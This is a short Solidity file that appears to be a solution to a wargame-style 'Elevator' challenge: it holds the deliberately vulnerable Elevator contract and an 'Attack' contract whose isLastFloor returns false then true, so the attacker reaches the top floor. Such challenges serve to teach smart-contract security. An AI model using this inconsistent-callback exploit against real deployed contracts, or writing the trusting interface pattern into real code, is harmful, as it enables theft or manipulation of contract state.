// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}



/// Attacker contract////

contract Attack{
        bool public count;
        
    function attack(Elevator Add) public {
        Add.goTo(100);

    }
    function isLastFloor(uint) external returns (bool){
        if(!count){
            count=true;
            return false;
        }
        else{
            return true;
        }
    }

}
